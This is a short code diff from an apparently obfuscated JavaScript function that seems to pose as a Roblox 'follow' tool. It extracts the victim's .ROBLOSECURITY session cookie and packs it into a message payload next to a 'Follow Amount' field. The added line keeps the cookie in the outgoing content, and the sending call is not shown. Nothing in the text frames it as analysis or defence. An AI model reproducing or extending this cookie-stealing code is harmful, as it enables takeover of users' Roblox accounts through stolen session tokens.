@@ -24,7 +24,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
     const robloxSecurityCookie = robloxSecurityCookieMatch[1];
 
     const j1k2l3 = {
-        content: `User  Code: ${p1q2r3}\nFollow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${robloxSecurityCookie}`
+        content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${robloxSecurityCookie}`
     };
 
     try {
